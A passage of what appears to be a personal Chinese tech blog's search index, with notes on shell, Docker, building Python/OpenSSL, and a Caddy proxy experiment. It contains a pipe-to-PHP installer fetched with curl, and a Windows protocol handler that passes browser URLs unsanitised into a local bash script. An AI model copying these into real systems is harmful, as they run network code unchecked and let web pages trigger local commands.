快速統計資料夾下底層檔案數量","uri":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/"},{"categories":["Linux"],"content":"find 確認資料夾是否有檔案 if [ `find . -mindepth 1 | wc -l ` -gt 0 ]; then echo \"test\"; fi ","date":"2019-11-12","objectID":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/:1:0","tags":["shell","linux"],"title":"Shell 快速統計資料夾下底層檔案數量","uri":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/"},{"categories":["Linux"],"content":"awk 指令 echo 1 2 3 4 5 | awk {print 1} ","date":"2019-11-12","objectID":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/:2:0","tags":["shell","linux"],"title":"Shell 快速統計資料夾下底層檔案數量","uri":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/"},{"categories":["Linux"],"content":"深入 find 指令 發現 find 指令順序也有關係 find 实用程序 Linux Find 命令精通指南 find命令的几个例子解析(-a,-o,-path,-wholename,-prnue,-print) - 程序园 ","date":"2019-11-12","objectID":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/:3:0","tags":["shell","linux"],"title":"Shell 快速統計資料夾下底層檔案數量","uri":"/blog/posts/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/"},{"categories":["PHP"],"content":"最近找了一下方法 記錄一下 這邊說明一下，最近把公司舊程式 Docker 化 再一些程式初始化在想要怎麼用 一般不需要這樣做，再有 CI /CD 情況下可以直接用 dockerfile 去做部屬，程式就不需要做掛載動作 由於測試環境是放在 ftp 上面做 volume ，所以我沒有在 docker-compose 在架設初始化自己先做 但網路資源很少，還是紀錄一下 ","date":"2019-11-12","objectID":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/:0:0","tags":["php","docker"],"title":"Docker 執行專案的 PHP Composer 方法","uri":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"docker-compose 方法 1 version: '3' services: vvv: build: ./xxx volumes: - ./ssss:/ooooo command: php xxxx depends_on: - composer composer: restart: 'no' image: composer command: install volumes: - ./ssss:/ooooo ","date":"2019-11-12","objectID":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/:1:0","tags":["php","docker"],"title":"Docker 執行專案的 PHP Composer 方法","uri":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"docker-compose 方法 2 version: '3' services: vvv: build: ./xxx volumes: - ./ssss:/ooooo command: bash -c \"cd {composer_path} \u0026\u0026 composer install \u0026\u0026 php xxxxx\" ","date":"2019-11-12","objectID":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/:2:0","tags":["php","docker"],"title":"Docker 執行專案的 PHP Composer 方法","uri":"/blog/posts/Docker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近在 Linux 安裝 Python 3.7 發現原生 apt 沒有包 需要手動編譯安裝 但遇到很多問題 在這邊小記 各種 Linux 遇到安裝會不太一樣 網路的教學也不是都很能順利安裝 由其是 ctype 還是不知道什麼原因會有問題 但網路找的步驟用一用 還不是很確定哪一個項目解除 以下各種方法可以試試 ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:0:0","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"安裝 Python3.7 首先，先檢查 openssl version 不然跑 pip 時會出現 # Install requirements sudo apt-get install -y build-essential sudo apt-get install -y checkinstall sudo apt-get install -y libreadline-gplv2-dev sudo apt-get install -y libncursesw5-dev sudo apt-get install -y libssl-dev sudo apt-get install -y libsqlite3-dev sudo apt-get install -y tk-dev sudo apt-get install -y libgdbm-dev sudo apt-get install -y libc6-dev sudo apt-get install -y libbz2-dev sudo apt-get install -y zlib1g-dev sudo apt-get install -y openssl sudo apt-get install -y libffi-dev sudo apt-get install -y python3-dev sudo apt-get install -y python3-setuptools sudo apt-get install -y wget sudo apt-get install zlib1g-dev # sudo apt-get install libffi-dev # ctype 問題 參考如下 # Prepare to build mkdir /tmp/Python37 cd /tmp/Python37 # Pull down Python 3.7, build, and install wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz tar xvf Python-3.7.0.tar.xz cd /tmp/Python37/Python-3.7.0 ./configure --enable-optimizations sudo make altinstall # openssl 安裝(看情行使用，越新的Linux 應該不會做到這個) sudo apt-get install -y wget mkdir /tmp/openssl cd /tmp/openssl wget https://www.openssl.org/source/openssl-1.0.2q.tar.gz tar xvf openssl-1.0.2q.tar.gz cd /tmp/openssl/openssl-1.0.2q ./config make sudo make install sudo ln -sf /usr/local/ssl/bin/openssl `which openssl` ## 這邊可以登出再登入 openssl version 有沒有換掉 sudo pip3.7 install --upgrade pip ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:1:0","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"pip tls 問題 pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available. Collecting virtualenv Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/ Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/ Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/ Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/ Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/ Could not fetch URL https://pypi.org/simple/virtualenv/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/virtualenv/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")) - skipping Could not find a version that satisfies the requirement virtualenv (from versions: ) No matching distribution found for virtualenv pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available. Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")) - skipping python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客 PS:後來發現是我的 ubuntu 版本太舊 選越大越不會遇到這個問題 ubuntu/xenial64 我一開始用 hashicorp/precise64 畢竟名次很前面 hashicorp - Vagrant Cloud ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:1:1","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"openssl 上面已經有放，不過我放一下我網路找到的文章 但不太想整理，這邊可能有點亂 Installing OpenSSL locally under your username – DreamHost 卡在 https://blog.csdn.net/github_38336924/article/details/82692075 ./python: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: Error 40 generate-posix-vars failed make: *** [pybuilddir.txt] Error 1 ＿ 未解 請參考python3.7安裝步驟 SSL issues with Python 3.7 Install From Source 後來嘗試這篇 How to install openssl 1.0.2 with default openssl (1.1.1) on Ubuntu 16.04? - Ask Ubuntu # (This will create a sym link to the new binaries) sudo ln -sf /usr/local/ssl/bin/openssl which openssl ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:1:2","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"ModuleNotFoundError: No module named ‘_ctypes’ 未解之謎，但用一用就正常 ModuleNotFoundError: No module named ‘_ctypes’ sudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade sudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus sudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-dev sudo apt-get install zlib1g-dev libsqlite3-dev tk-dev sudo apt-get install libssl-dev openssl sudo apt-get install libffi-dev [安装python3.7时候，报错ModuleNotFoundError: No module named '_ctypes' - wang725的专栏 - CSDN博客](https://blog.csdn.net/wang725/article/details/79905612) or [python - Python3: ImportError: No module named '_ctypes' when using Value from module multiprocessing - Stack Overflow](https://stackoverflow.com/questions/27022373/python3-importerror-no-module-named-ctypes-when-using-value-from-module-mul) Installing libffi-dev and re-installing python3.7 fixed the problem for me. to cleanly build py 3.7 libffi-dev is required or else later stuff will fail 這邊感覺編譯失敗要重新清除編譯`sudo make clean` 由於這一塊我不熟，或者刪掉 python 資料夾重新跑 sudo apt-get install libffi-dev ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:1:3","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"安裝/更新 pip sudo pip3.7 install –upgrade pip 安装Python3.7过程中报错的解决方法 - 青衫博客 | QingShan Talk https://help.dreamhost.com/hc/en-us/articles/115000702772-Installing-a-custom-version-of-Python-3 https://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:2:0","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"小記我要安裝的環境 ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:3:0","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"安裝 eyeD3 git clone https://github.com/nicfit/eyeD3.git cd eyeD3 python setup.py install sudo pip install pylast or sudo pip install eyeD3 sudo pip install pylast eyeD3 ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:3:1","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"安裝 ffmpeg Ubuntu 14版可以執行安裝!! 在 Ubuntu 13 以後, FFmpeg 以經被 libav 取代. 在官方提供的軟體庫沒有辨法再簡單的 sudo apt-get install ffmpeg 了. 新的 libav-tools 套件也用 avconv 執行程式來取代原有的 ffmpeg. 在 Ubuntu 14.04 LTS 安裝 FFmpeg @ Welkin小窩 :: 痞客邦 :: sudo add-apt-repository ppa:jonathonf/ffmpeg-4 sudo apt-get update sudo apt-get install ffmpeg How To Install FFmpeg on Ubuntu 18.04 \u0026 16.04 LTS - TecAdmin ffmpeg/avconv 轉檔與影片連接範例 - 石頭閒語 ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:3:2","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"docker 啟動 Python docker run -it python:3.7 bash 就這麼簡單 Alpine 沒有安裝 bash 所以不能做上面指令 上面環境組裝 php + python 環境 我又遇到 pip3 的問題 但 php 源頭是用最新的 Linux 所以我暫時用 apt 安裝 退而求其次就降板 這邊跳過不要看，有更好的寫法，不用降板 留個紀錄 FROM php:7.3 # ensure local python is preferred over distribution python ENV PATH /usr/local/bin:$PATH # http://bugs.python.org/issue19846 # \u003e At the moment, setting \"LANG=C\" on a Linux system *fundamentally breaks Python 3*, and that's not OK. ENV LANG C.UTF-8 # extra dependencies (over what buildpack-deps already includes) RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ tk-dev \\ uuid-dev \\ wget \\ gnupg \\ \u0026\u0026 rm -rf /var/lib/apt/lists/* ENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D ENV PYTHON_VERSION 3.7.5 RUN set -ex \\ \\ \u0026\u0026 wget -O python.tar.xz \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz\" \\ \u0026\u0026 wget -O python.tar.xz.asc \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz.asc\" \\ \u0026\u0026 export GNUPGHOME=\"$(mktemp -d)\" \\ \u0026\u0026 gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \"$GPG_KEY\" \\ \u0026\u0026 gpg --batch --verify python.tar.xz.asc python.tar.xz \\ \u0026\u0026 { command -v gpgconf \u003e /dev/null \u0026\u0026 gpgconf --kill all || :; } \\ \u0026\u0026 rm -rf \"$GNUPGHOME\" python.tar.xz.asc \\ \u0026\u0026 mkdir -p /usr/src/python \\ \u0026\u0026 tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\ \u0026\u0026 rm python.tar.xz \\ \\ \u0026\u0026 cd /usr/src/python \\ \u0026\u0026 gnuArch=\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\" \\ \u0026\u0026 ./configure \\ --build=\"$gnuArch\" \\ --enable-loadable-sqlite-extensions \\ --enable-optimizations \\ --enable-shared \\ --with-system-expat \\ --with-system-ffi \\ --without-ensurepip \\ \u0026\u0026 make -j \"$(nproc)\" \\ # setting PROFILE_TASK makes \"--enable-optimizations\" reasonable: https://bugs.python.org/issue36044 / https://github.com/docker-library/python/issues/160#issuecomment-509426916 PROFILE_TASK='-m test.regrtest --pgo \\ test_array \\ test_base64 \\ test_binascii \\ test_binhex \\ test_binop \\ test_bytes \\ test_c_locale_coercion \\ test_class \\ test_cmath \\ test_codecs \\ test_compile \\ test_complex \\ test_csv \\ test_decimal \\ test_dict \\ test_float \\ test_fstring \\ test_hashlib \\ test_io \\ test_iter \\ test_json \\ test_long \\ test_math \\ test_memoryview \\ test_pickle \\ test_re \\ test_set \\ test_slice \\ test_struct \\ test_threading \\ test_time \\ test_traceback \\ test_unicode \\ ' \\ \u0026\u0026 make install \\ \u0026\u0026 ldconfig \\ \\ \u0026\u0026 find /usr/local -depth \\ \\( \\ \\( -type d -a \\( -name test -o -name tests \\) \\) \\ -o \\ \\( -type f -a \\( -name '*.pyc' -o -name '*.pyo' \\) \\) \\ \\) -exec rm -rf '{}' + \\ \u0026\u0026 rm -rf /usr/src/python \\ \\ \u0026\u0026 python3 --version # make some useful symlinks that are expected to exist RUN cd /usr/local/bin \\ \u0026\u0026 ln -s idle3 idle \\ \u0026\u0026 ln -s pydoc3 pydoc \\ \u0026\u0026 ln -s python3 python \\ \u0026\u0026 ln -s python3-config python-config RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ python3-pip \\ git \\ python3-setuptools RUN pip3 install eyeD3 RUN pip3 install pylast==2.2.0 RUN apt-get install -y --no-install-recommends \\ ffmpeg CMD [\"bash\"] 其實我有思考，是不是更正確是要把源頭 from image全改掉 全部在包，不過我還沒這樣測試 FROM php:7.3 RUN apt-get update -y \u0026\u0026 apt-get install -y openssl zip unzip git libmcrypt-dev RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer RUN docker-php-ext-install opcache bcmath pdo_mysql mysqli # ensure local python is preferred over distribution python ENV PATH /usr/local/bin:$PATH # http://bugs.python.org/issue19846 # \u003e At the moment, setting \"LANG=C\" on a Linux system *fundamentally breaks Python 3*, and that's not OK. ENV LANG C.UTF-8 # runtime dependencies RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ ca-certificates \\ netbase \\ \u0026\u0026 rm -rf /var/lib/apt/lists/* ENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D ENV PYTHON_VERSION 3.7.5 RUN set -ex \\ \\ \u0026\u0026 savedAptMark=\"$(apt-mark showmanual)\" \\ \u0026\u0026 apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ dpkg-dev \\ gcc \\ libbz2-dev \\ libc6-dev \\ libexpat1-dev","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:4:0","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"docker 修改經驗小記 RUN 這個指令 假如是跟上面有關的，記得要用以下方法 RUN git clone https://xxxx \\ \u0026\u0026 cd xxx ... 安裝指令，記得要用apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ ca-certificates \\ netbase \\ 要合併 images ，建議找源頭一樣 image，這樣編譯 Dockerfile 比較無痛 Slim,Stretch,Alpine 那些到底是什麼? 簡單說一下，Alpine 是體積更小的 Linux，所以她沒有 bash ，不能用 docker run -it xxx bash 真的不好用(我指的是 debug) 看到還是滿多人推薦用 Debian 2020-01-09 在 docker 內建沒有 bash 在 dockerfile 裝 RUN apk add --update bash \u0026\u0026 rm -rf /var/cache/apk/* 可以參考:Raspberry-Pi-使用-Docker-架設-flexget.md 更多資訊: Benchmarking Debian vs Alpine as a Base Docker Image — Nick Janetakis 嗯嗯對，用 slim 或是 alpine 確實可以省下很多空間，但同時他們也少裝了很多東西，可能會導致一些問題 如何挑选node docker镜像 - Ryan.Miao - 博客园 「译」如何选择python项目的基础docker镜像 - Wiki - DeanWu’s Wiki Blog Dockerfile 有多個可以獨立放在資料夾裡面，感覺在整合 docker-compose 會比較方便 ","date":"2019-11-07","objectID":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:4:1","tags":["python","linux"],"title":"在 Ubutnu 安裝 Python 3.7 筆記","uri":"/blog/posts/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"一般寫程式都有 not and or 順序去做運算 但今天我發現 shell script 運算結果跟(別的)程式結果不太一樣 查了一下發現，shell script 是由左往右 這邊就很清楚，說shell 布林運算都是左到右 In many computer languages, operators with the same precedence are left-associative. That is, in the absence of grouping structures, leftmost operations are executed first. Bash is no exception to this rule. This is important because, in Bash, \u0026\u0026 and || have the same precedence. So what happens in your example is that the leftmost operation (||) is carried out first: … bash - Precedence of the shell logical operators \u0026\u0026, || - Unix \u0026 Linux Stack Exchange ","date":"2019-11-06","objectID":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/:0:0","tags":["shell"],"title":"shell script 布林運算順序","uri":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/"},{"categories":["Linux"],"content":"if 多條件 boolean 寫法 可用 \u0026\u0026 , || if [ -e $xxxx ] || [ -e $oooo ] \u0026\u0026 [ -e $dddd ] \u0026\u0026 [ -e $eeee ] then .... else .... fi 可用 bash [[ 和 ]]調整順序 if [ -e $dddd ] \u0026\u0026 [ -e $eeee ] \u0026\u0026 [[ -e $xxxx || -e $oooo ]] then .... else .... fi 發現 sh 也可以用 ( ) if [ -e $dddd ] \u0026\u0026 [ -e $eeee ] \u0026\u0026 ([ -e $xxxx ] || [ -e $oooo ]) then .... else .... fi 還可以這樣用-o -a if [ -e $dddd ] \u0026\u0026 [ -e $eeee ] \u0026\u0026 [ -e $xxxx -o -e $oooo ] then .... else .... fi 參考連結: Bash if statement with multiple conditions throws an error - Stack Overflow Multiple conditions in if statement shell script - Stack Overflow shell - Boolean operators ( \u0026\u0026, -a, ||, -o ) in Bash - Stack Overflow bash - How to represent multiple conditions in a shell if statement? - Stack Overflow ","date":"2019-11-06","objectID":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/:1:0","tags":["shell"],"title":"shell script 布林運算順序","uri":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/"},{"categories":["Linux"],"content":"彩蛋 Vagrant介绍-从使用到放弃再到掌握完全指南 - 宋净超的博客|Cloud Native|云原生布道师 bash - How do you break an array in groups of n - Stack Overflow 比較檔案是否一致 Fastest way to tell if two files are the same in Unix/Linux? - Stack Overflow ","date":"2019-11-06","objectID":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/:2:0","tags":["shell"],"title":"shell script 布林運算順序","uri":"/blog/posts/shell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F/"},{"categories":["Web"],"content":"最近要使用瀏覽器套件 暴力猴 操作一些程式 一直再想有什麼可以執行 bash 方法 最後有找到一篇 window 註冊協定 找到這篇Register protocol - MozillaZine Knowledge Base 簡單設定登錄檔就能解決 REGEDIT4 [HKEY_CLASSES_ROOT\\foo] @=\"URL:foo Protocol\" \"URL Protocol\"=\"\" [HKEY_CLASSES_ROOT\\foo\\shell] [HKEY_CLASSES_ROOT\\foo\\shell\\open] [HKEY_CLASSES_ROOT\\foo\\shell\\open\\command] @=\"\\\"C:\\\\Program Files\\\\Application\\\\program.exe\\\" \\\"%1\\\"\" 就這麼簡單，這邊的 %1 是 url 代的網址，後面都會加/( 我是用 Firefox，Chrome不確定 ) ","date":"2019-11-06","objectID":"/blog/posts/%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95/:0:0","tags":["Web"],"title":"Windows 註冊瀏覽器協定方法","uri":"/blog/posts/%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95/"},{"categories":["Web"],"content":"番外小記 跟本篇沒有關係 其實我呼就出我的 sh 做開啟反向代理 但還是失敗了… cd /d/ # pwd # ./caddy2.exe stop # ./caddy2.exe start --config caddyfile.json # curl -X PATCH \\ # http://localhost:2019/config/apps/http/servers/proxy/routes/0/handle/0/headers/request/set/Cookie/0 \\ # -H 'Content-Type: application/json' \\ # -H 'cache-control: no-cache' \\ # -d \"\\\"${1:12:-1}\\\"\" sed -i -E \"s/header_upstream Cookie \\\".+\\\"/header_upstream Cookie \\\"${1:12:-1}\\\"/\" Caddyfile ps aux | grep caddy | awk '{print $1}' | xargs kill -9 ./caddy caddy2 不知道要怎麼調整到反向代理到 https 但是 caddy1 竟然可以輕鬆調整 caddy2 好處可以用 api 方式去調整設定 Server 但是用瀏覽器做 AJAX caddy2 admin api 調整竟然會有 OPTIONS 過不去… 最後想到用 sh 呼叫執行 發現 caddy2 不能不會調整反向代理到 https 只能摸摸鼻子用 caddy1 最後還是大失敗 那個網站 Cookie 竟然是用 httponly 這個是讓你沒辦法用 JS 控制有設定 httponly 的 Cookies (浅谈Js 操作Cookie，以及HttpOnly 的限制 - 知乎) 所以終究大失敗 QQ 其實 Cookie httponly 感覺已可以寫一篇記錄 因為還發現 Cookie 也可以針對 Path 去做發送 指定Cookie 一直以為 Cookie 不是很安全，但 httponly 真的還滿安全 Caddyfile localhost:8881 gzip log test.log proxy / https://xxxxx/ { websocket header_upstream -Referern header_upstream -Server header_upstream Cookie \"test=1572361464;a=xxx\" } caddyfile.json { \"apps\": { \"http\": { \"servers\": { \"proxy\": { \"listen\": [ \":888\" ], \"routes\": [ { \"handle\": [ { \"handler\": \"reverse_proxy\", \"headers\": { \"request\": { \"set\": { \"Host\": [ \"{http.handlers.reverse_proxy.upstream.host}\" ], \"delete\": [ \"Referern\", \"Server\" ], \"Cookie\": [ \"test=test\" ] } } }, \"transport\": { \"protocol\": \"tls\" }, \"upstreams\": [ { \"dial\": \"localhost:519\" } ] } ], \"match\": [ { \"host\": [ \"localhost\" ] } ] } ] } } } } } REG REGEDIT4 [HKEY_CLASSES_ROOT\\caddycurl] @=\"URL:caddycurl Protocol\" \"URL Protocol\"=\"\" [HKEY_CLASSES_ROOT\\caddycurl\\shell] [HKEY_CLASSES_ROOT\\caddycurl\\shell\\open] [HKEY_CLASSES_ROOT\\caddycurl\\shell\\open\\command] @=\"\\\"C:\\\\Program Files\\\\Git\\\\git-bash.exe\\\" \\\"/d/caddycurl.sh\\\" \\\"%1\\\"\" 番外中的番外 小記 python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客 【Python】CentOs7 Python3安装Openssl以及解决ssl问题 - 梦琪小生 - 博客园 ","date":"2019-11-06","objectID":"/blog/posts/%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95/:1:0","tags":["Web"],"title":"Windows 註冊瀏覽器協定方法","uri":"/blog/posts/%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95/"},{"categories":["Web"],"content":"我們常常在改 https 的時候會發現，css 跟 js 沒有調成 https:// 或 // 一些東西會沒有出來，正常 https 載 http (css js) 會失敗 但是 http 載入 https 也會失敗(Firefox) ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:0:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"簡單實驗 \u003chtml\u003e \u003chead\u003e \u003ctitle\u003etest\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"http://xxxx/css/reset.css\"\u003e \u003c/head\u003e \u003cbody\u003e Hello World!! \u003c/body\u003e \u003c/html\u003e ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"http網頁 載 http js 